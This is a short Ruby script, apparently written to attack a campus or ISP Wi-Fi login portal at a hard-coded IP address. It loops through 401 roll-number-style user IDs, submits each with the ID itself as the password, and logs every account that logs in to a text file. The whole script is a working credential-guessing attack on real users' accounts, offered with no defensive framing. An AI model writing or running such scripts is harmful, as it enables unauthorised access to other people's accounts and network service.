require 'rubygems'
require 'mechanize'




for i in 100..500
		num = i


		agent = Mechanize.new
		page = agent.get('http://115.248.50.60/registration/Main.jsp?sessionId=1503318374759&wispId=1')
		google_form = page.form('chooseAuthForm')
		google_form.loginUserId = "17BCL0"+num.to_s
		google_form.loginPassword = "17BCL0"+num.to_s
		page = agent.submit(google_form)

		if(page.title.length==47)
			xfile2=File.open("choot.txt","a")
			xfile2.write(google_form.loginUserId)
			xfile2.puts()
			puts google_form.loginUserId
			xfile2.close()
		else
			puts "nope"
		end

end